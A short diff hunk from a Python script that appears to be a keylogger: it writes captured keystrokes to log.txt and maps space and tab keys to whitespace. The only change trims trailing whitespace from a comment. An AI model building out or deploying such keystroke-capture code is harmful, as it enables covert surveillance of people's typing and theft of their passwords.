@@ -20,7 +20,7 @@ def write_file(key):
     with open("log.txt","a") as f:
         for key in keys: #every key that is going to be pressed within this list of keys
             k = str(key).replace("'", "") #--> call them as k and convert them into a string | and to replace those single qoutes with nothing.
-            if k.find("space") > 0: #to see if someone is pressing spacebar,shift,tab... 
+            if k.find("space") > 0: #to see if someone is pressing spacebar,shift,tab..
                 f.write(' ')
             elif k.find("tab") > 0:
                 f.write('   ')
